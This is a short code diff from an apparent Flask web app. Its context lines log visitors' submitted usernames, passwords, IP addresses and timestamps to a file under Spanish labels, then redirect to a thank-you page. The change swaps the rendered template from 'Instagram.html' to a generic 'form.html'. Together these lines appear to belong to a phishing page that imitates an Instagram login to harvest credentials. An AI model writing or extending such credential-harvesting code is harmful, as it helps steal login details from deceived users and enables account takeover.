@@ -16,7 +16,7 @@ def index():
             f.write(f"Usuario: {username} | Contraseña: {password} | IP: {ip} | Fecha: {time}\n")
 
         return redirect(url_for('gracias'))
-    return render_template("Instagram.html")
+    return render_template("form.html")
 
 @app.route('/gracias')
 def gracias():
